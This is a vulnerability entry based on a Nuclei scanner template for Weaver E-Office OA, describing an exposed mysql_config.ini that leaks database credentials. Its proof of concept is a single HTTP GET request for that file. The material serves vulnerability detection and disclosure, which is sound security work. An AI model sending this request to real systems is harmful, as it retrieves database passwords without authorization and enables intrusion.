# Nuclei Template: OA E-Office mysql_config.ini - Information Disclosure
**Template ID:** weaver-mysql-config-exposure
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`weaver-mysql-config-info-leak.yaml`)

## Vulnerability Information & PoC

## Description
E-Office mysql_config.ini file can be directly accessed, leaking database account password and other information

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/mysql_config.ini
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20E-Office%20mysql_config.ini%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
